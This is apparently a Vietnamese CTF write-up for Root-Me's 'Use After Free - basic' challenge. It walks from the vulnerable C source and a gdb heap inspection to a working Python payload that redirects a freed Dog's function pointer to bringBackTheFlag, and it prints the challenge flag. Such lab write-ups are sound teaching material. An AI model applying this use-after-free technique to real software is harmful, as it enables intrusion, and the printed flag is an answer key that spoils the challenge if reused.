---
layout: post
title:  "ELF x86 - Use After Free - basic"
date:   2020-11-14
categories: Writeup,pwn
---

[Challenges](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Use-After-Free-basic)


**1.Source code**

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define BUFLEN 64

struct Dog {
    char name[12];
    void (*bark)();
    void (*bringBackTheFlag)();
    void (*death)(struct Dog*);
};

struct DogHouse{
    char address[16];
    char name[8];
};

int eraseNl(char* line){
    for(;*line != '\n'; line++);
    *line = 0;
    return 0;
}

void bark(){
    int i;
    for(i = 3; i > 0; i--){
        puts("UAF!!!");
        sleep(1);
    }
}

void bringBackTheFlag(){
    char flag[32];
    FILE* flagFile = fopen(".passwd","r");
    if(flagFile == NULL)
    {
        puts("fopen error");
        exit(1);
    }
    fread(flag, 1, 32, flagFile);
    flag[20] = 0;
    fclose(flagFile);
    puts(flag);
}

void death(struct Dog* dog){
    printf("%s run under a car... %s 0-1 car\n", dog->name, dog->name);
    free(dog);
}

struct Dog* newDog(char* name){
    printf("You buy a new dog. %s is a good name for him\n", name);
    struct Dog* dog = malloc(sizeof(struct Dog));
    strncpy(dog->name, name, 12);
    dog->bark = bark;
    dog->bringBackTheFlag = bringBackTheFlag;
    dog->death = death;
    return dog;
}

void attachDog(struct DogHouse* dogHouse, struct Dog* dog){
    printf("%s lives in %s.\n", dog->name, dogHouse->address);
}

void destruct(struct DogHouse* dogHouse){
    if(dogHouse){
        puts("You break the dog house.");
        free(dogHouse);
    }
    else
        puts("You do not have a dog house.");
}

struct DogHouse* newDogHouse(){
    char line[BUFLEN] = {0};
    
    struct DogHouse* dogHouse = malloc(sizeof(struct DogHouse));
    
    puts("Where do you build it?");
    fgets(line, BUFLEN, stdin);
    eraseNl(line);
    strncpy(dogHouse->address, line, 16);
    
    puts("How do you name it?");
    fgets(line, 64, stdin);
    eraseNl(line);
    strncpy(dogHouse->name, line, 8);
    
    puts("You build a new dog house.");
    
    return dogHouse;
}

int main(){
    int end = 0;
    char order = -1;
    char nl = -1;
    char line[BUFLEN] = {0};
    struct Dog* dog = NULL;
    struct DogHouse* dogHouse = NULL;
    while(!end){
        puts("1: Buy a dog\n2: Make him bark\n3: Bring me the flag\n4: Watch his death\n5: Build dog house\n6: Give dog house to your dog\n7: Break dog house\n0: Quit");
        order = getc(stdin);
        nl = getc(stdin);
        if(nl != '\n'){
            exit(0);
        }
        fseek(stdin,0,SEEK_END);
        switch(order){
        case '1':
            puts("How do you name him?");
            fgets(line, BUFLEN, stdin);
            eraseNl(line);
            dog = newDog(line);
            break;
        case '2':
            if(!dog){
                puts("You do not have a dog.");
                break;
            }
            dog->bark();
            break;
        case '3':
            if(!dog){
                puts("You do not have a dog.");
                break;
            }
            printf("Bring me the flag %s!!!\n", dog->name);
            sleep(2);
            printf("%s prefers to bark...\n", dog->name);
            dog->bark();
            break;
        case '4':
            if(!dog){
                puts("You do not have a dog.");
                break;
            }
            dog->death(dog);
            break;
        case '5':
            dogHouse = newDogHouse();
            break;
        case '6':
            if(!dog){
                puts("You do not have a dog.");
                break;
            }
            if(!dogHouse){
                puts("You do not have a dog house.");
                break;
            }
            attachDog(dogHouse, dog);
            break;
        case '7':
            if(!dogHouse){
                puts("You do not have a dog house.");
                break;
            }
            destruct(dogHouse);
            break;
        case '0':
        default:
            end = 1;
        }
    }
    return 0;
}
```
**2.Review source code**

Các điểm cần lưu ý:
- Vùng cấp phát bộ nhớ của Dog có 12 byte cho name và 3 pointer <b>*bark,*bringBackTheFlag,*death</b> . Trong khi đó, Doghouse có 16 byte cho addresss và 8 byte cho name.
```
struct Dog {
    char name[12];
    void (*bark)();
    void (*bringBackTheFlag)();
    void (*death)(struct Dog*);
};
```
```
struct DogHouse{
    char address[16];
    char name[8];
};
```
- Hàm death() thực hiện giải phóng dog, nhưng không reset lại pointer. Vì thế 3 pointer <b>*bark,*bringBackTheFlag,*death</b> vẫn sẽ còn trên heap.
```
void death(struct Dog* dog){
    printf("%s run under a car... %s 0-1 car\n", dog->name, dog->name);
    free(dog);
}
```
**3.Review heap**

- Thông tin binary
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   94 Symbols     Yes      0               4       ./ch63
ASLR is ON
```
- Mở file bằng gdb
```
gdb ./ch63
```
- Hiển thị các function
```
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x080484c0  _init
0x08048500  printf@plt
0x08048510  free@plt
0x08048520  fgets@plt
0x08048530  fclose@plt
0x08048540  sleep@plt
0x08048550  __stack_chk_fail@plt
0x08048560  _IO_getc@plt
0x08048570  fseek@plt
0x08048580  fread@plt
0x08048590  malloc@plt
0x080485a0  puts@plt
0x080485b0  exit@plt
0x080485c0  __libc_start_main@plt
0x080485d0  fopen@plt
0x080485e0  strncpy@plt
0x080485f0  __gmon_start__@plt
0x08048600  _start
0x08048640  _dl_relocate_static_pie
0x08048650  __x86.get_pc_thunk.bx
0x08048660  deregister_tm_clones
0x080486a0  register_tm_clones
0x080486e0  __do_global_dtors_aux
0x08048710  frame_dummy
0x08048716  eraseNl
0x08048765  bark
0x080487cb  bringBackTheFlag
---Type <return> to continue, or q <return> to quit---
0x08048871  death
0x080488d3  newDog
0x0804896c  attachDog
0x080489c8  destruct
0x08048a3c  newDogHouse
0x08048b4b  main
0x08048dec  __x86.get_pc_thunk.ax
0x08048df0  __libc_csu_init
0x08048e50  __libc_csu_fini
0x08048e60  __stack_chk_fail_local
0x08048e74  _fini
```
- Đặt break tại các function **newDog, newDogHouse, death**

```
(gdb) b * bark 
Breakpoint 1 at 0x8048765
(gdb) b* newDog
Breakpoint 2 at 0x80488d3
(gdb) b* newDogHouse 
Breakpoint 3 at 0x8048a3c
(gdb) b * death 
Breakpoint 4 at 0x8048871
```
- Thực thi bằng **run**
```
run
```
- Chọn 1 và nhập giá trị **AAAA**, nhập c để chương trình tiếp tục chạy
![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/1.JPG)
- Chọn 4 để free dog. Chương trình sẽ break trước khi thực hiện việc free, vì vậy lúc này ta có thể kiểm tra thông tin heap.
![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/2.JPG)
- Sử dụng **info proc map** để tìm địa chỉ của vùng heap
```
(gdb) info proc map
process 5662
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804a000     0x2000        0x0 /challenge/app-systeme/ch63/ch63
         0x804a000  0x804b000     0x1000     0x1000 /challenge/app-systeme/ch63/ch63
         0x804b000  0x804c000     0x1000     0x2000 /challenge/app-systeme/ch63/ch63
         0x9595000  0x95b6000    0x21000        0x0 [heap]
        0xf7d48000 0xf7d4b000     0x3000        0x0 
        0xf7d4b000 0xf7ef3000   0x1a8000        0x0 /lib/old32/libc.so.6
        0xf7ef3000 0xf7ef4000     0x1000   0x1a8000 /lib/old32/libc.so.6
        0xf7ef4000 0xf7ef6000     0x2000   0x1a8000 /lib/old32/libc.so.6
        0xf7ef6000 0xf7ef7000     0x1000   0x1aa000 /lib/old32/libc.so.6
        0xf7ef7000 0xf7efc000     0x5000        0x0 
        0xf7efc000 0xf7eff000     0x3000        0x0 [vvar]
        0xf7eff000 0xf7f01000     0x2000        0x0 [vdso]
        0xf7f01000 0xf7f21000    0x20000        0x0 /lib/old32/ld-2.19.so
        0xf7f21000 0xf7f22000     0x1000    0x1f000 /lib/old32/ld-2.19.so
        0xf7f22000 0xf7f23000     0x1000    0x20000 /lib/old32/ld-2.19.so
        0xffd23000 0xffd44000    0x21000        0x0 [stack]
```
- Heap được bắt đầu từ **0x9595000** cho tới **0x95b6000**. Sử dụng **x/100x 0x9595000** để kiểm tra vùng nhớ heap
```
(gdb) x/100x 0x9595000
0x9595000:      0x00000000      0x00000021      0x41414141      0x00000000
0x9595010:      0x00000000      0x08048765      0x080487cb      0x08048871
0x9595020:      0x00000000      0x00020fe1      0x00000000      0x00000000
```
- **0x41414141** chính là **AAAA** do ta nhập vào. 8 byte **\x00** tiếp theo là vùng nhớ được cấp cho **name[12]**. **0x08048765** là vùng nhớ con trỏ **bark** trỏ vào, **0x080487cb** là vùng nhớ con trỏ **bringBackTheFlag** trỏ vào, **0x08048871** là vùng nhớ con trỏ **death** trỏ vào. Ta có thể kiểm tra bằng lệnh **info symbol**.

```
(gdb) info symbol 0x08048765
bark in section .text of /challenge/app-systeme/ch63/ch63
(gdb) info symbol 0x080487cb
bringBackTheFlag in section .text of /challenge/app-systeme/ch63/ch63
(gdb) info symbol 0x08048871
death in section .text of /challenge/app-systeme/ch63/ch63
```
- Nhập c để tiếp tục và chọn 5. Lúc này chương trình sẽ bị break sau khi free dog. Ta tiếp tục kiểm tra thông tin heap
![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/3.JPG)
```
(gdb) x/100x 0x9595000
0x9595000:      0x00000000      0x00000021      0x00000000      0x00000000
0x9595010:      0x00000000      0x08048765      0x080487cb      0x08048871
0x9595020:      0x00000000      0x00020fe1      0x00000000      0x00000000
```
- Ta có thể thấy được vùng dữ liệu đã được giải phóng. Do con trỏ không được reset, nên ta vẫn có thể gọi được dog->bark qua options 2.(Chó chết rồi nhưng vẫn sủa được)
- Nhập c để tiếp tục thực hiện việc điền thông tin cho DogHouse Với address là **BBBBCCCCDDDDEEEE** và Name là **FFFF**
![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/4.JPG)
- Nhập 2 để gọi **bark**, chương trình sẽ crash khi gọi **bark**
```
Where do you build it?
BBBBCCCCDDDDEEEE
How do you name it?
FFFF
You build a new dog house.
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
2

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
```
- Kiểm tra heap ta thấy bark tới **0x45454545** và crash. Vì con trỏ không được reset nên nó vẫn trỏ tới **0x9595014** và ta hoàn toàn có thể kiểm soát được giá trị ở địa chỉ này.
```
(gdb)  x/50x 0x9595000
0x9595000:      0x00000000      0x00000021      0x42424242      0x43434343
0x9595010:      0x44444444      0x45454545      0x46464646      0x00000000
0x9595020:      0x00000000      0x00020fe1      0x00000000      0x00000000
```
- Mục tiêu là viết giá trị **0x080487cb** (**bringBackTheFlag**)vào địa chỉ **0x9595014** 

**4.Payload**

```
python -c "print '1\n' + 'AAAA\n' + '4\n' + '5\n' + 'BBBBCCCCDDDD\xcb\x87\x04\x08\n' + 'FFFF\n' + '2\n'" | ./ch63
```

![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/5.JPG)

**5.Flag**

```
U44aafff_U4f_The_d0G
```
